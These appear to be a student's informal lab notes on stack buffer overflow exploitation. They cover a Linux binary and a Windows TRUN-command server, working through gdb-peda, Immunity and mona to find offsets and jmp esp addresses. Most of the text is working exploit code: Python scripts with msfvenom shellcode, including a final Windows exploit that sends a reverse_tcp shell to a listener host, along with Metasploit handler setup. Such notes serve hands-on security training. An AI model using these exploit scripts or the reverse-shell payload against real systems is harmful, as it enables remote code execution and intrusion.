
bru


---------------------------------------------------LINUX----------------------------------------------------------------------


PS C:\users\student\downloads> get-content .\func | select -first 1
PS C:\users\student\downloads> scp .\func student@10.50.29.94:

student@lin-ops:~$ strings func
student@lin-ops:~$ file func


ghidra reverse engineering ...
gets buffer overlfow

use debugger:
gdb ./func
gdb-peda$ (tells us which parts may be vulnerable)
info *functions*
pdisass main (dissasembles functions)
pdisass getuserinput
red sus (vuln)
run

make script 
#!/usr/bin/env python
buffer = "A" * 55
print(buffer)

gdb-peda$ run <<<$(./rev.py) 
(make buffer bigger)

chmod
student@lin-ops:~$ ./func $(./ohio.py)
student@lin-ops:~$ ./func <<<$(./ohio.py)

https://wiremask.eu/tools/buffer-overflow-pattern-generator/
in script, put the hex in "" (buffer var)
<<<

#!/usr/bin/env python
#buffer = "A" * 100
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
print (buffer)


gdb-peda$ run <<<$(./ohio.py)
eip field: 31634130 (copy)
wiremask (register value)^ 
offset value ***

#!/usr/bin/env python
buffer = "A" * 62
eip = "B" * 4
(print(buffer+eip))

new lin ops
env - gdb ./func
show env (lines and columns set, lets unset them ye)
unset env COLUMNS
unset env LINES
run (enough imput to break)
segmentation fault
info proc map (gdb preda)

identify top and bottom of stack (below heap, and bottom)
(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
                                    (jump esp)
grab first 4
in script, modify from little endian to big endian
make changes:
#jump esp location
#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop ="\x90" * 15
buf =  b""
buf += b"\xba\xa5\xac\xf3\x07\xd9\xc7\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x0b\x31\x56\x14\x83\xc6\x04\x03\x56"
buf += b"\x10\x47\x59\x99\x0c\xdf\x3b\x0c\x75\xb7\x16\xd2"
buf += b"\xf0\xa0\x01\x3b\x70\x46\xd2\x2b\x59\xf4\xbb\xc5"
buf += b"\x2c\x1b\x69\xf2\x28\xdb\x8e\x02\x40\xb3\xe1\x63"
buf += b"\xc3\x2a\xfe\x34\x48\x25\x1f\x77\xee"
print(buffer+eip+nop+buf)

print (x+x+x+x)
get first and change eip location to it ^^

exit clean gdb (not peda)
student@lin-ops:~$ msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
student@lin-ops:~$ msfdb init

*******msf6 payload(linux/x86/exec) > generate -b '\x00' -f python




final script:

#!/usr/bin/env python

#jump esp location
#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"

buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
nop ="\x90" * 15
buf =  b""
buf += b"\xba\xa5\xac\xf3\x07\xd9\xc7\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x0b\x31\x56\x14\x83\xc6\x04\x03\x56"
buf += b"\x10\x47\x59\x99\x0c\xdf\x3b\x0c\x75\xb7\x16\xd2"
buf += b"\xf0\xa0\x01\x3b\x70\x46\xd2\x2b\x59\xf4\xbb\xc5"
buf += b"\x2c\x1b\x69\xf2\x28\xdb\x8e\x02\x40\xb3\xe1\x63"
buf += b"\xc3\x2a\xfe\x34\x48\x25\x1f\x77\xee"
print(buffer+eip+nop+buf)


---------------------------------------------------WINDOWS----------------------------------------------------------------------


ls
?????? PS C:\users\student\downloads> .\SysinternalsSuite\strings.exe secureserverind
cannot be run in dos mode (windows exe)
get con
PS C:\users\student\downloads> .\secureserverind.exe
windows defender firewall (both red)
windows security: virus and threat protection all settings  turn off

new powershell: netstat -anob(admin)
look for securueserverind (9999 open)

student@lin-ops:~$ nc 10.50.29.94 9999
(nc windows op from linux op using the port open)
flashing icon: (run secureserverind again in powershell)
HELP
TRUN [any value]

ghidra: secureserver, anaylyze, search, TRUN, mem location
iVar1 = _strncmp(pcStack_1c,"TRUN ",5);
5 character limit
look at pcStack_1c 
pcStack_1c = (char *)_malloc(0x1000);     //4096
examine tf outa this shi yu hurd, no cap word ta von jit
strncpy
find function
strcpy (dest, source)
strcpy(local_7dc,param_1);
2008 <-- 3000
get a debugger(immunity run as admin)
file attach, attach secureserverind
play pause restart rewind

lin ops - create script (make sure immunipty runnning)

#!/usr/bin/env python
import socket

buf = "TRUN /.:/"
buf += "A" * 70  #any character in replace for 70
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #ipv4 and tcp socket
s.connect(("10.50.25.127", 9999)) #ip of win op, port open
print s.recv(1024)
s.send(buf)
print s.recv(1024)

s.close()


student@lin-ops:~$ chmod u+x winbuff.py 
./winbuff.py

next ->>>> find the size of that buffer jawn
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
(2008 ish)


COMMENT OUT THIS LINE ABOVE THIS BULLSHIT BELOW
buf += xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


./winbuff.py

immunity (broken boom)
eip overwritten
take eip into register wiremaksk
rewind, play

script: take away buf +x = ssssssssssssssssssssssssss
buf + "A" * 2003 (the offset in wiriemask)
buf += "BBBB"

run script, check immunity, eip overwritten

IN WHITEBAR (immunity) 
!monna modules
(checks dlls that are unprotected)

look into the dlls that are not aslr or nxcompatable for the jump esp location

IN WHITEBAR
!mona jmp -r esp -m "essfunc.dll"

window dropdown -> log data

copy addres at bottom: results (copy to clipboard address)
top 4
little endian big endian -> shit
replace 4 BBBB in script with first one

student@lin-ops:~$ msfvenom -p windows/shell/reverse_tcp lhost=10.50.29.94 lport=5555 -b "\x00" -f python

paste into script, not the orignal one set =, must be +=

msfconsole

msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
show boptions
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 5555 (port specifed earlier)
exploit / run

rewind immunity, play!@#$%^&*(QWERTYUI

add buf += "/x90" * 15 to script

------------------
script:

#!/usr/bin/env python
import socket


#625012A0 -> 0x62 50 12 A0 -> "\xA0\x12\x50\x62"
#625012AD -> 0x62 50 12 AD -> "\xAD\x12\x50\x62"
#625012BA -> 0x62 50 12 BA -> "\xBA\x12\x50\x62"
#625012C7 -> 0x62 50 12 C7 -> "\xC7\x12\x50\x62"

buf = "TRUN /.:/"
buf += "A" * 2003  #any character in replace for
buf += "\xA0\x12\x50\x62"
buf += "\x90" * 15
buf += b"\xba\xfd\x34\x95\x2d\xda\xce\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x59\x31\x53\x14\x83\xc3\x04\x03\x53"
buf += b"\x10\x1f\xc1\x69\xc5\x50\x2a\x92\x16\x0e\x1a\x40"
buf += b"\x72\x45\x0e\x54\xf0\x0b\xa3\x1f\x54\xbf\x32\xfa"
buf += b"\x56\x08\x0e\x23\xe2\x04\xa7\x1a\x0b\xd9\x77\xf0"
buf += b"\xcf\x78\x04\x0b\x1c\x5a\x35\xc4\x51\x9b\x72\x92"
buf += b"\x1c\x74\x2e\x72\x54\xd8\xdf\xf7\x28\xe0\xde\xd7"
buf += b"\x26\x58\x99\x52\xf8\x2c\x15\x5c\x29\x47\xfd\x7e"
buf += b"\x42\x1f\xe6\x2e\x55\x4c\x93\x06\x21\x4e\xad\x67"
buf += b"\x83\x25\xf9\x1c\x15\xef\x33\xe3\xd7\xc0\x39\x4f"
buf += b"\xd6\x19\x79\x6f\xac\x51\x79\x12\xb7\xa2\x03\xc8"
buf += b"\x32\x34\xa3\x9b\xe5\x90\x55\x4f\x73\x53\x59\x24"
buf += b"\xf7\x3b\x7e\xbb\xd4\x30\x7a\x30\xdb\x96\x0a\x02"
buf += b"\xf8\x32\x56\xd0\x61\x63\x32\xb7\x9e\x73\x9a\x68"
buf += b"\x3b\xf8\x09\x7e\x3b\x01\xd2\x7f\x61\x95\x1e\xb2"
buf += b"\x9a\x65\x09\xc5\xe9\x57\x96\x7d\x66\xdb\x5f\x58"
buf += b"\x71\x6a\x77\x5b\xad\xd4\x18\xa5\x4e\x24\x30\x62"
buf += b"\x1a\x74\x2a\x43\x23\x1f\xaa\x6c\xf6\xb5\xa0\xfa"
buf += b"\xf3\x7b\xa8\xa4\x6b\x79\xd2\x4d\xdf\xf4\x34\x3d"
buf += b"\x4f\x56\xe9\xfe\x3f\x16\x59\x97\x55\x99\x86\x87"
buf += b"\x55\x70\xaf\x22\xba\x2c\x87\xda\x23\x75\x53\x7a"
buf += b"\xab\xa0\x19\xbc\x27\x40\xdd\x73\xc0\x21\xcd\x64"
buf += b"\xb7\xc9\x0d\x75\x52\xc9\x67\x71\xf4\x9e\x1f\x7b"
buf += b"\x21\xe8\xbf\x84\x04\x6b\xc7\x7b\xd9\x5d\xb3\x4a"
buf += b"\x4f\xe1\xab\xb2\x9f\xe1\x2b\xe5\xf5\xe1\x43\x51"
buf += b"\xae\xb2\x76\x9e\x7b\xa7\x2a\x0b\x84\x91\x9f\x9c"
buf += b"\xec\x1f\xf9\xeb\xb2\xe0\x2c\x68\xb4\x1e\xb2\x47"
buf += b"\x1d\x76\x4c\xd8\x9d\x86\x26\xd8\xcd\xee\xbd\xf7"
buf += b"\xe2\xde\x3e\xd2\xaa\x76\xb4\xb3\x19\xe7\xc9\x99"
buf += b"\xfc\xb9\xca\x2e\x25\x4a\xb0\x5f\xda\xab\x45\x76"
buf += b"\xbf\xac\x45\x76\xc1\x91\x93\x4f\xb7\xd4\x27\xf4"
buf += b"\xc8\x63\x05\x5d\x43\x8b\x19\x9d\x46"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #ipv4 and tcp socket
s.connect(("10.50.25.127", 9999)) #ip of win op, port open
print s.recv(1024)
s.send(buf)
print s.recv(1024)

s.close()
-----------------------------





















































